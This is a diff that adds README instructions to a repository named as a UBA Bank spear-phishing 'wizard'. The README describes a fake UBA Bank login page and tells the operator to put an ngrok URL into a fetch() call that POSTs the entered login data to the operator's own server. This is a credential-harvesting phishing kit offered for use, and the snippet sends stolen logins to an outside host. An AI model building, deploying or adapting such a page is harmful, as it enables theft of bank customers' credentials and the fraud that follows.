@@ -2,6 +2,35 @@
 #############################################################################################################################
 # uba_spear_phishing_WIZARD
 
+NB: 
+# UBA Bank Login Page
+
+This repository contains the HTML code for a UBA Bank login page. To make the login form work, you need to replace the placeholder `https://ngrok-url.com/login` in the HTML script with your actual ngrok URL.
+
+**Steps to add your ngrok URL:**
+
+1. Open the `index.html` file in a text editor or any editor.
+
+2. Locate the following line:
+
+```html
+fetch('https://YOUR_NGROK_URL_HERE/login', {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json'
+  },
+  body: JSON.stringify(loginData)
+})
+
+
+3. Replace `YOUR_NGROK_URL_HERE` with your actual ngrok URL.
+
+4. Save the `index.html` file.
+
+Once you have replaced the placeholder URL with your ngrok URL, you can deploy the login page to a web server or use ngrok to create a public URL for your local development server.
+
+#№#####################*##
+script can be seen below ..
 
 
 
